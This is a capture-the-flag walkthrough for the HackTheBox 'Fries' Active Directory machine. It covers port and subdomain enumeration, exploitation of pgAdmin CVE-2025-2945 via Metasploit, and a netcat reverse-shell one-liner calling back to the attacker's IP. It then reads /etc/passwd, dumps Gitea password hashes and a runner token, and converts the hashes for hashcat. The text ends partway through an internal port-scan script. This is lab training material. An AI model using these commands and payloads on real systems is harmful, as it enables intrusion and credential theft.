- - - 
created : 23-11-2025 

Tags : #hard 

Released on 22 Nov 2025 (Season 9)
- - - 
# Machine Information

Please allow up to 7 minutes for services to load. As is common in real life Windows penetration tests, you will start the Fries box with credentials for the following account : `d.cooper@fries.htb / D4LE11maan!!`

Notes: There is a way with the certs to obtain root before user, involves find a way to get pwm before but that rely on getting a valid domain user first.
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ rustscan -a fries.htb -- -A

Open 10.10.11.96:22
Open 10.10.11.96:53
Open 10.10.11.96:80
Open 10.10.11.96:88

Open 10.10.11.96:135
Open 10.10.11.96:139
Open 10.10.11.96:389
Open 10.10.11.96:445
Open 10.10.11.96:443
Open 10.10.11.96:464
Open 10.10.11.96:593
Open 10.10.11.96:636

Open 10.10.11.96:2179
Open 10.10.11.96:3268
Open 10.10.11.96:3269
Open 10.10.11.96:5985
Open 10.10.11.96:9389

Open 10.10.11.96:49667
Open 10.10.11.96:49685
Open 10.10.11.96:49686
Open 10.10.11.96:49689
Open 10.10.11.96:49688
Open 10.10.11.96:49913
Open 10.10.11.96:49945
Open 10.10.11.96:49972

PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 62  OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 62  nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://fries.htb/


88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-23 22:41:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Issuer: commonName=fries-DC01-CA/domainComponent=fries
| Public Key type: rsa
443/tcp   open  ssl/http      syn-ack ttl 62  nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP/organizationalUnitName=PWM Configuration/localityName=Madrid/emailAddress=web@fries.htb
| Issuer: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP/organizationalUnitName=PWM Configuration/localityName=Madrid/emailAddress=web@fries.htb
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-23T22:43:50+00:00; -1m03s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Issuer: commonName=fries-DC01-CA/domainComponent=fries

2179/tcp  open  vmrdp?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found


9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49913/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49945/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49972/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-23T22:43:10
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46245/tcp): CLEAN (Timeout)
|   Check 2 (port 47430/tcp): CLEAN (Timeout)
|   Check 3 (port 23943/udp): CLEAN (Timeout)
|   Check 4 (port 21385/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1m03s, deviation: 0s, median: -1m03s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   31.13 ms 10.10.14.1
2   32.37 ms dc01.fries.htb (10.10.11.96)
```

This is a [Active Directory](../../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md) environment, you can check [Intro to Active Directory Theory](../Academy/Intro%20to%20Active%20Directory%20Theory.md)  and better understand all processes.

Let's add `dc01.fries.htb` to `/etc/hosts`.
# Enumeration

## SSH (22)

We try access:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ ssh dale@fries.htb
dale@fries.htb password: 
Permission denied, please try again.
```

Obviously, it would be too easy.
## HTTP (80)
### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u  http://fries.htb 

/about                (Status: 200) [Size: 14932]
/menu                 (Status: 200) [Size: 19931]
```

Nothing really interesting.
### FFuf

We use [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) for subdomain enumeration:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.fries.htb' -u http://fries.htb -fs 154 -c

code                    [Status: 200, Size: 13592, Words: 1048, Lines: 272, Duration: 49ms]
```

Now this is interesting, add it to the `/etc/hosts` file:

```bash
10.10.11.96 dc01.fries.htb dc.fries.htb fries.htb code.fries.htb 
```

And visit the page:

![Pasted image 20251123233855.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251123233855.png)

Try the credentials: `d.cooper@fries.htb / D4LE11maan!!`

![Pasted image 20251123234112.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251123234112.png)

We have the site repo, let's check the docker-compose file:

```js
version: '3.8'

services:
  web:
    image: fries-web
    working_dir: /app
    restart: always
    container_name: web
    command: /usr/local/bin/python3 run.py
    ports:
      - 127.0.0.1:5000:5000
    depends_on:
      - postgres
    networks:
      vpcbr2:
        ipv4_address: 172.18.0.2

  postgres:
    image: postgres:16
    container_name: postgres
    restart: always
    environment:
      POSTGRES_USER: EXAMPLE_USER
      POSTGRES_PASSWORD: EXAMPLE_PASSWORD
      POSTGRES_DB: ps_db
    volumes:
      - pgdata:/var/lib/postgresql/data
    networks:
        vpcbr2:
          ipv4_address: 172.18.0.3

volumes:
  pgdata:

networks:
  vpcbr2:
    driver: bridge
    ipam:
      config:
        - subnet: 172.18.0.0/16
          gateway: 172.18.0.1
```

Check commits:

![Pasted image 20251123234651.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251123234651.png)

**SECRET_KEY= y0st528wn1idjk3b9a**

From **README** file:

```bash
Ensure the backend PostgreSQL database is accessible and contains the necessary schema - `ps_db`
The backend database can be managed from `http://db-mgmt05.fries.htb`. (This requires infra access, contact Dylan, Mike or Dale)
Make sure the appropriate credentials and network routing are in place.
```

This is likely the way in the box, pivoting to the container, but first we'll try other enumeration on the domain because it's an hard machine and you can't know, or maybe you can find unintended paths.
## Kerberos (88)

We have to try to request a ticket for the given user, maybe will help with enumeration of the domain:

```bash
# Syncro time

─$ sudo ntpdate 10.10.11.96     
[sudo] password di mdn0x: 
2025-11-23 22:53:51.277552 (+0000) -63.001208 +/- 0.015898 10.10.11.96 s1 no-leap
CLOCK: time stepped by -63.001208

# Ticket request

─$ impacket-getTGT fries.htb/'d.cooper':'D4LE11maan!!'                        
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

We can't.
### Kerbrute 

Try domain users enumeration with `kerbrute` and some wordlists:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ ./kerbrute userenum --dc 10.10.11.96 -d fries.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

2025/11/23 22:57:53 >  [+] VALID USERNAME:       administrator@fries.htb
2025/11/23 22:58:33 >  [+] VALID USERNAME:       Administrator@fries.htb
2025/11/23 22:59:37 >  [+] VALID USERNAME:       web@fries.htb
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ ./kerbrute userenum --dc 10.10.11.96 -d fries.htb /usr/share/wordlists/john.smith.txt
```
## SMB (135,139,445) 

We check [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) using `nxc` and given credentials:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ netexec smb 10.10.11.96 -u d.cooper -p 'D4LE11maan!!' --shares
SMB         10.10.11.96     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.96     445    DC01             [-] fries.htb\d.cooper:D4LE11maan!! STATUS_LOGON_FAILURE
```

We can't.
## LDAP (389)

Check anonymous and then credential access:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ nxc ldap dc.hercules.htb -u 'd.cooper' -p 'D4LE11maan!!' 
LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
LDAP        10.10.11.91     389    DC               [-] hercules.htb\d.cooper:D4LE11maan!! STATUS_NOT_SUPPORTED
```

Not supported, these credentials seems not to work on the domain.
# Exploit

Returning to the found subdomain we can find some **CVEs** online for `PgAdmin` version 9.1.

[CVE-2025-2945 ](CVE-2025-2945.md)will land you in the container.

[Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md) PoC:

https://github.com/abrewer251/CVE-2025-2945_PgAdmin_PoC
## Vulnerability Details (CVE-2025-2945)

- **Affected Software**:
    - pgAdmin 4 versions **8.10** through **9.1** (inclusive)
- **Fixed In**:
    - pgAdmin 4 version **9.2** (released April 4, 2025)
- **CVSS v3.1 Score**: 9.9 (Critical)
- **Impact**:
    - An authenticated attacker can send a specially crafted `query_commited` (or `high_availability` in the Cloud Deployment module) parameter to an `eval()` call on the server, resulting in arbitrary code execution under the pgAdmin service account.
## Metasploit

Using [Metasploit-Framework (MSF)](../../../3%20-%20Tags/Hacking%20Tools/Metasploit-Framework%20(MSF).md) module `multi/http/pgadmin_query_tool_authenticated`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ sudo msfconsole
[sudo] password di mdn0x: 

msf > use multi/http/pgadmin_query_tool_authenticated
msf exploit(multi/http/pgadmin_query_tool_authenticated) > options

Module options (exploit/multi/http/pgadmin_query_tool_authenticated):

   Name           Current Setting             Required  Description
   ----           ---------------             --------  -----------
   DB_NAME        postgres                    yes       The database to authenticate to
   DB_PASS        PsqLR00tpaSS11              yes       The password to authenticate to the database
                                                        with
   DB_USER        root                        yes       The username to authenticate to the database
                                                        with
   MAX_SERVER_ID  10                          yes       The maximum number of Server IDs to try and c
                                                        onnect to.
   PASSWORD       D4LE11maan!!                yes       The password to authenticate to pgadmin with
   Proxies                                    no        A proxy chain of format type:host:port[,type:
                                                        host:port][...]. Supported proxies: socks4, s
                                                        ocks5, socks5h, http, sapni
   RHOSTS         fries.htb                   yes       The target host(s), see https://docs.metasplo
                                                        it.com/docs/using-metasploit/basics/using-met
                                                        asploit.html
   RPORT          80                          yes       The target port (TCP)
   SSL            false                       no        Negotiate SSL/TLS for outgoing connections
   USERNAME       d.cooper@fries.htb          yes       The username to authenticate to pgadmin with
   VHOST          db-mgmt05.fries.htb  no               HTTP server virtual host

Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.21      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Python payload

msf exploit(multi/http/pgadmin_query_tool_authenticated) > run
[*] Started reverse TCP handler on 10.10.14.21:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
[+] Successfully authenticated to pgAdmin
[+] Successfully initialized sqleditor
[*] Exploiting the target...
[*] Sending stage (23408 bytes) to 10.10.11.96
[+] Received a 500 response from the exploit attempt, this is expected
[*] Meterpreter session 1 opened (10.10.14.21:4444 -> 10.10.11.96:49878) at 2025-11-24 00:13:29 +0000

meterpreter > shell
Process 234 created.
Channel 1 created.

whoami
pgadmin
pwd
/pgadmin4
ls
DEPENDENCIES
LICENSE
branding.py
commit_hash
config.py
config_distro.py
docs
gunicorn_config.py
migrations
pgAdmin4.py
pgAdmin4.wsgi
pgacloud
pgadmin
run_pgadmin.py
setup.py
version.py

env
HOSTNAME=cb46692a4590
SHLVL=1
PGADMIN_DEFAULT_PASSWORD=HTB{REDACTED_PASSWD}
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
SERVER_SOFTWARE=gunicorn/22.0.0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OAUTHLIB_INSECURE_TRANSPORT=1
CORRUPTED_DB_BACKUP_FILE=
PWD=/pgadmin4
PGAPPNAME=pgAdmin 4 - CONN:8388534
PYTHONPATH=/pgadmin4

cb46692a4590:/pgadmin4$ cat config_distro.py
CA_FILE = '/etc/ssl/certs/ca-certificates.crt'
LOG_FILE = '/dev/null'
HELP_PATH = '../../docs'
DEFAULT_BINARY_PATHS = {
        'pg': '/usr/local/pgsql-17',
        'pg-17': '/usr/local/pgsql-17',
        'pg-16': '/usr/local/pgsql-16',
        'pg-15': '/usr/local/pgsql-15',
        'pg-14': '/usr/local/pgsql-14',
        'pg-13': '/usr/local/pgsql-13'

cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
postfix:x:100:101:postfix:/var/spool/postfix:/sbin/nologin
vmail:x:101:102:vmail:/var/mail/domains:/sbin/nologin
pgadmin:x:5050:0::/home/pgadmin:/sbin/nologin
```

We are in the container and we have another password: `HTB{REDACTED_PASSWD}` for `admin@fries.htb`

Now use [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) with [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md):

```bash
pwd
/tmp
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.21 1337 >/tmp/f
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ nc -lvnp 1337            
listening on [any] 1337 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.96] 49863
/bin/sh: cant access tty; job control turned off
/tmp $ export TERM=xterm
/tmp $ python3 -c 'import pty;pty.spawn("/bin/bash")'
cb46692a4590:/tmp$ ^Z
zsh: suspended  nc -lvnp 1337

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                    reset

cb46692a4590:/$ ls
bin            home           opt            run            tmp
dev            lib            pgadmin4       sbin           usr
entrypoint.sh  media          proc           srv            var
etc            mnt            root           sys            venv

cb46692a4590:/$ ./entrypoint.sh

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.
```

The passwords are not working here, let's continue to enumerate the container and find the db:

```bash
cb46692a4590:/usr/local/pgsql-17$ ls
pg_dump     pg_dumpall  pg_restore  psql

cb46692a4590:/pgadmin4$ nc -vz 172.18.0.3 5432         # We know it from docker-compose file
172.18.0.3 (172.18.0.3:5432) open

cb46692a4590:/pgadmin4$ /usr/local/pgsql-17/psql -h 172.18.0.3 -U root -d ps_db
Password for user root: HTB{REDACTED_PASSWD}

psql (17.4, server 16.9 (Debian 16.9-1.pgdg120+1))
Type "help" for help.

ps_db=# \l
                                                 List of databases
   Name    | Owner | Encoding | Locale Provider |  Collate   |   Ctype    | Locale | ICU Rules | Access privileges 
-----------+-------+----------+-----------------+------------+------------+--------+-----------+-------------------
 gitea     | root  | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 postgres  | root  | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 ps_db     | root  | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 template0 | root  | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/root          +
           |       |          |                 |            |            |        |           | root=CTc/root
 template1 | root  | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/root          +
           |       |          |                 |            |            |        |           | root=CTc/root
(5 rows)

ps_db=# \dt
          List of relations
 Schema |    Name    | Type  | Owner 
--------+------------+-------+-------
 public | menu_items | table | root
 public | staff      | table | root
(2 rows)

postgres=# \c gitea
psql (17.4, server 16.9 (Debian 16.9-1.pgdg120+1))
You are now connected to database "gitea" as user "root".

gitea=# \dt
                 List of relations
 Schema |           Name            | Type  | Owner 
--------+---------------------------+-------+-------
 public | access                    | table | root
 public | access_token              | table | root
 public | action                    | table | root
 public | action_artifact           | table | root
 public | action_run                | table | root
 public | action_run_index          | table | root
 public | action_run_job            | table | root
 public | action_runner             | table | root
 public | action_runner_token       | table | root
 public | action_schedule           | table | root
 public | action_schedule_spec      | table | root
 public | action_task               | table | root
 public | action_task_output        | table | root
 public | action_task_step          | table | root
 public | action_tasks_version      | table | root
 public | action_variable           | table | root
 public | app_state                 | table | root
 public | attachment                | table | root
 public | auth_token                | table | root
 public | badge                     | table | root
 public | branch                    | table | root
 public | collaboration             | table | root
 public | comment                   | table | root
 public | commit_status             | table | root
 public | commit_status_index       | table | root
 public | commit_status_summary     | table | root
 public | dbfs_data                 | table | root
 public | dbfs_meta                 | table | root
 public | deploy_key                | table | root
 public | email_address             | table | root
 public | email_hash                | table | root
 public | external_login_user       | table | root
 public | follow                    | table | root
 public | gpg_key                   | table | root
 public | gpg_key_import            | table | root
 public | hook_task                 | table | root
 public | issue                     | table | root
 public | issue_assignees           | table | root
 public | issue_content_history     | table | root
 public | issue_dependency          | table | root
 public | issue_index               | table | root
 public | issue_label               | table | root
 public | issue_user                | table | root
 public | issue_watch               | table | root
 public | label                     | table | root
 public | language_stat             | table | root
 public | lfs_lock                  | table | root
 public | lfs_meta_object           | table | root
 public | login_source              | table | root
 public | milestone                 | table | root
 public | mirror                    | table | root
 public | notice                    | table | root
 public | notification              | table | root
 public | oauth2_application        | table | root
 public | oauth2_authorization_code | table | root
 public | oauth2_grant              | table | root
 public | org_user                  | table | root
 public | package                   | table | root
 public | package_blob              | table | root
 public | package_blob_upload       | table | root
 public | package_cleanup_rule      | table | root
 public | package_file              | table | root
 public | package_property          | table | root
 public | package_version           | table | root
 public | project                   | table | root
 public | project_board             | table | root
 public | project_issue             | table | root
 public | protected_branch          | table | root
 public | protected_tag             | table | root
 public | public_key                | table | root
 public | pull_auto_merge           | table | root
 public | pull_request              | table | root
 public | push_mirror               | table | root
 public | reaction                  | table | root
 public | release                   | table | root
 public | renamed_branch            | table | root
 public | repo_archiver             | table | root
 public | repo_indexer_status       | table | root
 public | repo_redirect             | table | root
 public | repo_topic                | table | root
 public | repo_transfer             | table | root
 public | repo_unit                 | table | root
 public | repository                | table | root
 public | review                    | table | root
 public | review_state              | table | root
 public | secret                    | table | root
 public | session                   | table | root
 public | star                      | table | root
 public | stopwatch                 | table | root
 public | system_setting            | table | root
 public | task                      | table | root
 public | team                      | table | root
 public | team_invite               | table | root
 public | team_repo                 | table | root
 public | team_unit                 | table | root
 public | team_user                 | table | root
 public | topic                     | table | root
 public | tracked_time              | table | root
 public | two_factor                | table | root
 public | upload                    | table | root
 public | user                      | table | root
 public | user_badge                | table | root
 public | user_blocking             | table | root
 public | user_open_id              | table | root
 public | user_redirect             | table | root
 public | user_setting              | table | root
 public | version                   | table | root
 public | watch                     | table | root
 public | webauthn_credential       | table | root
 public | webhook                   | table | root
 
gitea=# \dt user
       List of relations
 Schema | Name | Type  | Owner 
--------+------+-------+-------
 public | user | table | root
(1 row)

gitea=# SELECT * FROM public."user";
 id |  lower_name   |     name      |  full_name  |          email          | keep_email_private | email_notifications_preference |                                                passwd                                                | passwd_hash_algo | must_change_password | login_type | login_source | login_name | type | location | website |              rands               |               salt               | language | description | created_unix | updated_unix | last_login_unix | last_repo_visibility | max_repo_creation | is_active | is_admin | is_restricted | allow_git_hook | allow_import_local | allow_create_organization | prohibit_login |              avatar              |      avatar_email       | use_custom_avatar | num_followers | num_following | num_stars | num_repos | num_teams | num_members | visibility | repo_admin_change_team_access | diff_view_style |   theme    | keep_activity_private 
----+---------------+---------------+-------------+-------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+-------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+-------------------+------------------------+-----------------+---More-- 
  2 | dale          | dale          | Dale Cooper | d.cooper@fries.htb      | f                  | enabled                        | HTB{REDACTED_HASH}| pbkdf2$50000$50  | f                    |          0 |            0 |            |    0 |          |         | HTB{REDACTED_HASH} | HTB{REDACTED_HASH} | en-US    |             |   1748423754 |   1763947767 |      1763947767 | f                    |                -1 | t         | f        | f             | f              | f                  | t                         | f              | HTB{REDACTED_HASH} | dale@fries.htb          | f                 |             0 |             0 |         0 |         1 |         0 |           0 |          0 | f                             | unified         | gitea-auto | f
  1 | administrator | administrator |             | administrator@fries.htb | f                  | enabled                        | HTB{REDACTED_HASH} | pbkdf2$50000$50  | f                    |          0 |            0 |            |    0 |          |         | HTB{REDACTED_HASH} | HTB{REDACTED_HASH} | en-US    |             |   1748423492 |   1748429902 |      1748423492 | f                    |                -1 | t         | t        | f             | f              | f                  | t                         | f              | HTB{REDACTED_HASH} | administrator@fries.htb | f      |           0 |          0 | f                             | unified         | gitea-auto | f
(2 rows)

gitea=# SELECT name, passwd, salt FROM public."user" WHERE name='dale';
 name |                                                passwd                                                |               salt               
------+------------------------------------------------------------------------------------------------------+----------------------------------
 dale | HTB{REDACTED_HASH}HTB{REDACTED_HASH} | 48bb6cb68aa810841c0e4f6d9bf19592

gitea=# SELECT name, passwd, salt FROM public."user" WHERE name='administrator'; 
     name      |                                                passwd                                                |               salt               
---------------+------------------------------------------------------------------------------------------------------+----------------------------------
 administrator | HTB{REDACTED_HASH} | 65c13aa196bbd6189387a345febfdc21
(1 row)

```

Craft the `PBKDF2-HMAC-SHA256` input for [Hashcat](../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md):

```bash
# Dale
hash: HTB{REDACTED_HASH}
salt: 48bb6cb68aa810841c0e4f6d9bf19592
iterations: 50000

sha256:50000:48bb6cb68aa810841c0e4f6d9bf19592:HTB{REDACTED_HASH}

# Administrator
sha256:50000:65c13aa196bbd6189387a345febfdc21:HTB{REDACTED_HASH}
```

Now convert it:

```python
import base64
import sys

salt_hex = sys.argv[1]
hash_hex = sys.argv[2]
iterations = sys.argv[3]

salt_b64 = base64.b64encode(bytes.fromhex(salt_hex)).decode()
hash_b64 = base64.b64encode(bytes.fromhex(hash_hex)).decode()

print(f"sha256:{iterations}:{salt_b64}:{hash_b64}")

─$ nano convert.py
─$ chmod +x convert.py 
```

Use the script:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/user]
└─$ python3 convert.py 48bb6cb68aa810841c0e4f6d9bf19592 HTB{REDACTED_HASH} 50000

sha256:50000:SLtstoqoEIQcHTB{REDACTED_HASH}

─$ python3 convert.py 65c13aa196bbd6189387a345febfdc21 HTB{REDACTED_HASH} 50000
sha256:50000:ZcE6oZa71HTB{REDACTED_HASH}
```

First we check if `dale`'s passwd is the given one:

```python
─$ cat check.py
import hashlib, binascii

password = b"D4LE11maan!!"
salt_hex = "48bb6cb68aa810841c0e4f6d9bf19592"
iterations = 50000

salt = bytes.fromhex(salt_hex)

dk = hashlib.pbkdf2_hmac("sha256", password, salt, iterations, dklen=50)

print(binascii.hexlify(dk).decode())

─$ python3 check.py
8ba77f28df211ea62db7fbecbfb595cd0568f9e34e0832ae87dfa45154f592eff45453041f1c1b7cc46dc62b94cb70abc67e
```

This is exactly the same, meaning the found hash is for the given password for `d.cooper` also confirming that d. stands for `Dale`.
## Hashcat 

We have to try to crack only `administrator` hash, we save it and finally feed it into [Hashcat](../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md):

```bash
─$ nano admin_hash.b64   

─$ hashcat admin_hash.b64 /usr/share/wordlists/rockyou.txt 
```

We can't, so this is likely a trap/rabbit hole.

Next thing we check  for `tokens` and maybe deploy `keys`:

```bash
gitea=# SELECT * FROM action_runner_token;
 id |                  token                   | owner_id | repo_id | is_active |  created   |  updated   | deleted 
----+------------------------------------------+----------+---------+-----------+------------+------------+---------
  1 | qs5gPrpSRIJIabXo0r5kETH8WcCxuufcIND5O0D8 |        2 |       0 | t         | 1763952244 | 1763952244 |        
(1 row)

gitea=# SELECT id, client_id, client_secret FROM oauth2_application;
 id |              client_id               | client_secret 
----+--------------------------------------+---------------
  1 | a4792ccc-144e-407e-86c9-5e7d8d9c3269 | 
  2 | e90ee53c-94e2-48ac-9358-a874fb9e0662 | 
  3 | d57cb8c4-630c-4168-8324-ec79935e18d4 | 
(3 rows)
```

These are the only result i found here, this is a Gitea Actions Runner Token

```bash
gitea=# SELECT id, name, owner_id FROM repository WHERE owner_id = 2;
 id |   name    | owner_id 
----+-----------+----------
  1 | fries.htb |        2
```

This path is not working for me.
## Reverse Port Forward

Returning at the found password in `env`, we can use a python script to scan the internal ips, first check the ip for the container:

```bash
cb46692a4590:/$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether be:ff:14:cf:ca:ef brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.4/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
cb46692a4590:/$ python
Python 3.12.9 (main, Feb  7 2025, 17:39:29) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.

cb46692a4590:/$ ip route
default via 172.18.0.1 dev eth0 
172.18.0.0/16 dev eth0 scope link  src 172.18.0.4 

cb46692a4590:/$ route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         172.18.0.1      0.0.0.0         UG    0      0        0 eth0
172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
```

You are inside a container with IP `172.18.0.4`.  

Now find internal ips and open ports:

```python
import socket
import os
import ipaddress
import concurrent.futures

TIMEOUT = 0.2
THREADS = 300
